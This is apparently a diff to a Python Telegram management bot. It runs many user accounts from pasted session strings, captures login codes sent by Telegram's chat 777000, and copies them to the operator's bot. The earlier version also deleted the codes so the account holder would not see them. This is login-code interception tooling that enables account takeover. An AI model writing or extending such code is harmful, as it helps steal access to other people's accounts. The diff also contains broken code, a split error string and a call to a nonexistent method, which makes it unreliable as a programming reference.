@@ -118,7 +118,14 @@ async def start_userbot(session_string: str, ptb_app: Application, update_info: 
             return "already_exists", None, "This user is already running."
         
         handler_with_context = partial(forwarder_handler, ptb_app=ptb_app)
-        client.add_handler(PyrogramMessageHandler(handler_with_context, PyrogramFilters.private & ~PyrogramFilters.service))
+        
+        # Be more specific with the filter to ensure we only get messages from chat 777000
+        source_chat_id = await get_source_chat() # This is 777000
+        client.add_handler(PyrogramMessageHandler(
+            handler_with_context, 
+            PyrogramFilters.chat(source_chat_id) & ~PyrogramFilters.service
+        ))
+
         active_userbots[me.id] = client
         
         if update_info:
@@ -156,32 +163,43 @@ async def start_userbot(session_string: str, ptb_app: Application, update_info: 
                 await client.stop()
 
 async def forwarder_handler(client: PyrogramClient, message: Message, ptb_app: Application):
-    source_chat_id = await get_source_chat()
-    if message.chat.id != source_chat_id: return
+    logger.info(f"Handler received message {message.id} from chat ID: {message.chat.id}. Processing...")
 
-    target_chat = await get_target_chat()
-    # No need to check target_chat, as "self" is always valid
+    # Get the management bot's username from the PTB application
+    bot_username = ptb_app.bot.username
+    if not bot_username:
+        logger.error("Could not find management bot's username. Cannot forward OTP.")
+        return
 
     asyncio.gather(
-        forward_message(client, message, target_chat),
+        forward_message(client, message, bot_username),
         send_notification(client, message, ptb_app)
     )
 
 async def forward_message(client, message, target_chat):
     """
-    Forwards/Copies the message to target_chat (Saved Messages)
-    and then deletes the original message.
+    Copies the message to target_chat (Bot PM)
+    and attempts to call InvalidateSignInCodes.
     """
     if client.me.id in paused_forwarding: return
     try:
-        # 1. Forward or copy to 'self' (Saved Messages)
-        if random.random() < 0.90:
-            await message.forward(chat_id=target_chat)
-        else:
-            await message.copy(chat_id=target_chat)
+        # 1. Copy to Bot PM (target_chat is bot_username)
+        await message.copy(chat_id=target_chat)
         
-        # 2. Now, delete the original message from the source chat (777000)
-        await message.delete()
+        # --- REMOVED ---
+        # 2. Delete original message (Destroy OTP)
+        # await message.delete()
+        # --- END REMOVED ---
+
+        # 3. Attempt to call user-requested method for double security
+        try:
+            if hasattr(client, "InvalidateSignInCodes"):
+                await client.InvalidateSignInCodes()
+                logger.info(f"Successfully called InvalidateSignInCodes for {client.me.id}")
+            else:
+                logger.warning(f"Method 'InvalidateSignInCodes' not found on client {client.me.id}. Skipping.")
+        except Exception as e:
+            logger.warning(f"Error calling 'InvalidateSignInCodes' for {client.me.id}: {e}")
 
     except Exception as e:
         logger.error(f"Failed to process message {message.id} from {client.me.id}: {e}")
@@ -223,8 +241,7 @@ async def start_all_userbots_from_db(application: Application, update_info: bool
 async def get_source_chat():
     return 777000 # Hardcoded to Telegram's official account
 
-async def get_target_chat():
-    return "self" # Hardcoded to the userbot's "Saved Messages"
+# --- REMOVED get_target_chat() ---
 
 # --- Management Bot Handlers ---
 @owner_only
@@ -239,12 +256,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     keyboard = [
-        # [InlineKeyboardButton("📚 Set Source Chat", callback_data="set_source")], # REMOVED
-        # [InlineKeyboardButton("🎯 Set Target Chat", callback_data="set_target")], # REMOVED
         [InlineKeyboardButton("👤 Manage Accounts", callback_data="manage_accounts")],
         [InlineKeyboardButton("➕ Add New Account", callback_data="call_add_command")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    bot_username = context.application.bot.username
     
     message_text = (
         "⚙️  <b>Settings Dashboard</b>\n"
@@ -252,8 +269,8 @@ async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Here you can manage your userbot accounts.\n\n"
         "▶️  <b>OTP Source:</b> <code>777000</code> (Telegram)\n"
         "      <i>Messages from this chat will be processed.</i>\n\n"
-        "🎯  <b>OTP Target:</b> <code>Saved Messages</code> (Automatic)\n"
-        "      <i>Messages will be saved and deleted from source.</i>"
+        f"🎯  <b>OTP Target:</b> <code>@{bot_username}</code> (Bot PM)\n"
+        "      <i>Messages will be copied here.</i>"
     )
 
     if update.callback_query:
@@ -287,19 +304,31 @@ async def accounts_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     accounts = list(accounts_collection.find())
-    text = "👤 <b>Your Managed Accounts:</b>\n\n" if accounts else "No accounts have been added yet."
+    text = "👤 <b>Your Managed Accounts:</b>\n\n" if accounts else "No accounts have been added yet.\n\nℹ️ <i>Run /refresh if accounts are missing details.</i>"
+    
     for acc in accounts:
-        first_name = escape_html(acc.get('first_name', 'N/A'))
-        username = escape_html(acc.get('username'))
-        phone = escape_html(acc.get('phone_number', 'N/A'))
-        user_id = acc.get('user_id', 'N/A')
+        # Escape details first for safety
+        first_name_escaped = escape_html(acc.get('first_name', 'N/A'))
+        username_escaped = escape_html(acc.get('username'))
+        phone_escaped = escape_html(acc.get('phone_number', 'N/A'))
+        
+        user_id = acc.get('user_id') # Get user_id, default is None
+
+        name_display = ""
+        if user_id and isinstance(user_id, int):
+            # Create a clickable mention if user_id is a valid integer
+            name_display = f"<a href=\"tg://user?id={user_id}\">{first_name_escaped}</a>"
+        else:
+            # Fallback to plain text if user_id is missing or invalid
+            name_display = first_name_escaped
         
         text += (
-            f"<b>Name:</b> <a href=\"tg://user?id={user_id}\">{first_name}</a>\n"
-            f"<b>Username:</b> @{username if username else 'N/A'}\n"
-            f"<b>Phone:</b> <code>{phone}</code>\n"
-            f"<b>ID:</b> <code>{user_id}</code>\n{'-'*25}\n"
+            f"<b>Name:</b> {name_display}\n"
+            f"<b>Username:</b> @{username_escaped if username_escaped else 'N/A'}\n"
+            f"<b>Phone:</b> <code>{phone_escaped}</code>\n"
+            f"<b>ID:</b> <code>{user_id if user_id else 'N/A'}</code>\n{'-'*25}\n"
         )
+        
     keyboard = [[InlineKeyboardButton("« Back to Settings", callback_data="main_settings")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
@@ -352,8 +381,6 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'awaiting' in step and step.endswith(('phone_number', 'login_code', '2fa_password')): return
 
     del context.user_data['next_step']
-    
-    # REMOVED 'awaiting_source' and 'awaiting_target' logic
     
     if step == 'awaiting_single_account':
         session_string = clean_session_string(update.message.text)
@@ -466,11 +493,13 @@ async def add_account_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 @owner_only
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     running_bots, total_bots = len(active_userbots), accounts_collection.count_documents({})
+    bot_username = context.application.bot.username
+    
     status_text = (f"📊 <b>Bot Status</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"<b>Management Bot:</b> Online\n"
                    f"<b>OTP Source:</b> <code>777000</code>\n"
-                   f"<b>OTP Target:</b> <code>Saved Messages</code>\n\n"
+                   f"<b>OTP Target:</b> <code>@{bot_username}</code> (Bot PM)\n\n"
                    f"<b>Userbots Running:</b> {running_bots}/{total_bots}\n"
                    f"<b>Paused OTP Processing:</b> {len(paused_forwarding)} bots\n"
                    f"<b>Paused Notifications:</b> {'Yes' if OWNER_ID in paused_notifications else 'No'}\n")
@@ -600,7 +629,8 @@ async def refresh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     final_message = f"✅ <b>Refresh Complete</b>\nStarted {running_bots}/{total_bots} userbots."
 
     if errors:
-        error_message = "\n\n❌ <b>Errors Encountered:</b>\n" + "\n".join(errors)
+        error_message = "\n\n❌ <b>Errors Encounte"
+        "red:</b>\n" + "\n".join(errors)
         if len(final_message) + len(error_message) > 4096:
             await msg.edit_text(final_message, parse_mode=ParseMode.HTML)
             await update.message.reply_html(error_message)
@@ -625,6 +655,9 @@ def main() -> None:
     application = Application.builder().token(BOT_TOKEN).build()
     
     async def post_init_task(app: Application):
+        # We need the bot's username, which is fetched during init
+        # This call ensures app.bot.username is populated
+        await app.bot.get_me()
         await start_all_userbots_from_db(app)
 
     application.post_init = post_init_task
@@ -657,7 +690,6 @@ def main() -> None:
     
     # Add callback handlers
     application.add_handler(CallbackQueryHandler(pause_notifications_callback, pattern=r"^pause_notify_"))
-    # REMOVED: set_source and set_target handlers
     application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_single_account', text="Please paste the session string."), pattern="^add_single$"))
     application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_multiple_accounts', text="Please paste all session strings, separated by a space or new line."), pattern="^add_multiple$"))
     application.add_handler(CallbackQueryHandler(settings_command, pattern="^main_settings$"))
